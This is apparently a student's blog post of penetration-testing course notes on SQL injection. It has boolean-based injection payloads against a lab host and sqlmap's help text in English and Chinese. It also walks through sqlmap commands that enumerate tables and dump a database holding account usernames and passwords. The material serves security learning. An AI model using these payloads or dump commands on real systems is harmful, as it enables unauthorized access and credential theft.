---
layout: post
title: "SQL Injection"
date: "2022-07-04"
author: "r3kind1e"
header-img: "img/post-bg-Penetration Testing Student.png"
catalog:    true
tags: 
    - Penetration Testing Student
    - Web Attacks
---

# SQL Injection
首先，浏览应用程序，找到可能的SQL注入点。

```
sqli.site/view.php?id=2230
```

使用了无效的sql
```
sqli.site/view.php?id='
```

```
sqli.site/view.php?id=2230' and 1=1;-- -
```

```
sqli.site/view.php?id=2230' and 1=2;-- -
```

```
SELECT views_counter WHERE id='2230' and 1=1;-- -
```

true and true

```
sqli.site/view.php?id=9999999999999
```

```
SELECT views_counter WHERE id='2230' and 1=2;-- -
```

SQL盲注。

```
└─# sqlmap -h
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.6.6#stable}
|_ -| . [)]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

Usage: python3 sqlmap [options]

Options:
  -h, --help            Show basic help message and exit
  -hh                   Show advanced help message and exit
  --version             Show program's version number and exit
  -v VERBOSE            Verbosity level: 0-6 (default 1)

  Target:
    At least one of these options has to be provided to define the
    target(s)

    -u URL, --url=URL   Target URL (e.g. "http://www.site.com/vuln.php?id=1")
    -g GOOGLEDORK       Process Google dork results as target URLs

  Request:
    These options can be used to specify how to connect to the target URL

    --data=DATA         Data string to be sent through POST (e.g. "id=1")
    --cookie=COOKIE     HTTP Cookie header value (e.g. "PHPSESSID=a8d127e..")
    --random-agent      Use randomly selected HTTP User-Agent header value
    --proxy=PROXY       Use a proxy to connect to the target URL
    --tor               Use Tor anonymity network
    --check-tor         Check to see if Tor is used properly

  Injection:
    These options can be used to specify which parameters to test for,
    provide custom injection payloads and optional tampering scripts

    -p TESTPARAMETER    Testable parameter(s)
    --dbms=DBMS         Force back-end DBMS to provided value

  Detection:
    These options can be used to customize the detection phase

    --level=LEVEL       Level of tests to perform (1-5, default 1)
    --risk=RISK         Risk of tests to perform (1-3, default 1)

  Techniques:
    These options can be used to tweak testing of specific SQL injection
    techniques

    --technique=TECH..  SQL injection techniques to use (default "BEUSTQ")

  Enumeration:
    These options can be used to enumerate the back-end database
    management system information, structure and data contained in the
    tables

    -a, --all           Retrieve everything
    -b, --banner        Retrieve DBMS banner
    --current-user      Retrieve DBMS current user
    --current-db        Retrieve DBMS current database
    --passwords         Enumerate DBMS users password hashes
    --tables            Enumerate DBMS database tables
    --columns           Enumerate DBMS database table columns
    --schema            Enumerate DBMS schema
    --dump              Dump DBMS database table entries
    --dump-all          Dump all DBMS databases tables entries
    -D DB               DBMS database to enumerate
    -T TBL              DBMS database table(s) to enumerate
    -C COL              DBMS database table column(s) to enumerate

  Operating system access:
    These options can be used to access the back-end database management
    system underlying operating system

    --os-shell          Prompt for an interactive operating system shell
    --os-pwn            Prompt for an OOB shell, Meterpreter or VNC

  General:
    These options can be used to set some general working parameters

    --batch             Never ask for user input, use the default behavior
    --flush-session     Flush session files for current target

  Miscellaneous:
    These options do not fit into any other category

    --wizard            Simple wizard interface for beginner users

[!] to see full list of options run with '-hh'
```

```
用法：python3 sqlmap [选项]

选项：
  -h, --help 显示基本帮助信息并退出
  -hh 显示高级帮助信息并退出
  --version 显示程序的版本号并退出
  -v VERBOSE 详细级别：0-6（默认为 1）

  目标：
    必须提供这些选项中的至少一个来定义
    目标

    -u URL，--url=URL 目标 URL（例如“http://www.site.com/vuln.php?id=1”）
    -g GOOGLEDORK 将 Google dork 结果作为目标 URL 处理

  要求：
    这些选项可用于指定如何连接到目标 URL

    --data=DATA 要通过 POST 发送的数据字符串（例如“id=1”）
    --cookie=COOKIE HTTP Cookie 标头值（例如“PHPSESSID=a8d127e..”）
    --random-agent 使用随机选择的 HTTP User-Agent 标头值
    --proxy=PROXY 使用代理连接到目标 URL
    --tor 使用 Tor 匿名网络
    --check-tor 检查 Tor 是否正确使用

  注射：
    这些选项可用于指定要测试的参数，
    提供自定义注入负载和可选的篡改脚本

    -p TESTPARAMETER 可测试参数
    --dbms=DBMS 强制后端 DBMS 提供值

  检测：
    这些选项可用于自定义检测阶段

    --level=LEVEL 要执行的测试级别（1-5，默认 1）
    --risk=RISK 执行测试的风险（1-3，默认1）
    
技巧：
    这些选项可用于调整特定 SQL 注入的测试
    技术

    --technique=TECH.. 要使用的 SQL 注入技术（默认为“BEUSTQ”）

  枚举：
    这些选项可用于枚举后端数据库
    管理系统信息、结构和数据包含在
    表

    -a, --all 检索所有内容
    -b, --banner 检索 DBMS 横幅
    --current-user 检索 DBMS 当前用户
    --current-db 检索 DBMS 当前数据库
    --passwords 枚举 DBMS 用户密码哈希
    --tables 枚举 DBMS 数据库表
    --columns 枚举 DBMS 数据库表列
    --schema 枚举 DBMS 模式
    --dump 转储 DBMS 数据库表条目
    --dump-all 转储所有 DBMS 数据库表条目
    -D DB DBMS 数据库枚举
    -T TBL DBMS 数据库表枚举
    -C COL DBMS 数据库表列枚举

  操作系统访问：
    这些选项可用于访问后端数据库管理
    系统底层操作系统

    --os-shell 提示交互式操作系统外壳
    --os-pwn 提示 OOB shell、Meterpreter 或 VNC

  一般的：
    这些选项可以用来设置一些通用的工作参数

    --batch 从不​​要求用户输入，使用默认行为
    --flush-session 刷新当前目标的会话文件

  各种各样的：
    这些选项不属于任何其他类别

    --wizard 适合初学者的简单向导界面

[!] 查看使用 '-hh' 运行的选项的完整列表
```

```
Target:
    At least one of these options has to be provided to define the
    target(s)

    -u URL, --url=URL   Target URL (e.g. "http://www.site.com/vuln.php?id=1")

Injection:
    These options can be used to specify which parameters to test for,
    provide custom injection payloads and optional tampering scripts

    -p TESTPARAMETER    Testable parameter(s)
    --dbms=DBMS         Force back-end DBMS to provided value

Detection:
    These options can be used to customize the detection phase

    --level=LEVEL       Level of tests to perform (1-5, default 1)
    --risk=RISK         Risk of tests to perform (1-3, default 1)

Techniques:
    These options can be used to tweak testing of specific SQL injection
    techniques

    --technique=TECH..  SQL injection techniques to use (default "BEUSTQ")

Enumeration:
    These options can be used to enumerate the back-end database
    management system information, structure and data contained in the
    tables

    -a, --all           Retrieve everything
    -b, --banner        Retrieve DBMS banner
    --current-user      Retrieve DBMS current user
    --current-db        Retrieve DBMS current database
    --passwords         Enumerate DBMS users password hashes
    --tables            Enumerate DBMS database tables
    --columns           Enumerate DBMS database table columns
    --schema            Enumerate DBMS schema
    --dump              Dump DBMS database table entries
    --dump-all          Dump all DBMS databases tables entries
    -D DB               DBMS database to enumerate
    -T TBL              DBMS database table(s) to enumerate
    -C COL              DBMS database table column(s) to enumerate

Miscellaneous:
    These options do not fit into any other category

    --wizard            Simple wizard interface for beginner users
```

```
sqlmap -u http://sqli.site/view.php?id=1
```

databse banner
```
sqlmap -u http://sqli.site/view.php?id=1 -b
```

retrive more info about the database and its structure.
```
sqlmap -u http://sqli.site/view.php?id=1 --tables
```

```
Database: selfie4you
[2 tables]
accounts
attachments
```

```
sqlmap -u http://sqli.site/view.php?id=1 --current-db selfie4you --columns
```

```
Database: selfie4you
Table: accounts
[4 columns]

Column Type
accountid mediumint(9)
id mediumint(8)
password text
username text

Database: selfie4you
Table: attachments
[5 columns]

Column Type
account mediumint(9)
filename text
id mediumint(8) unsigned
uploaded varchar(255)
views mediumint(9)
```

```
sqlmap -u http://sqli.site/view.php?id=1 --current-db selfie4you --dump
```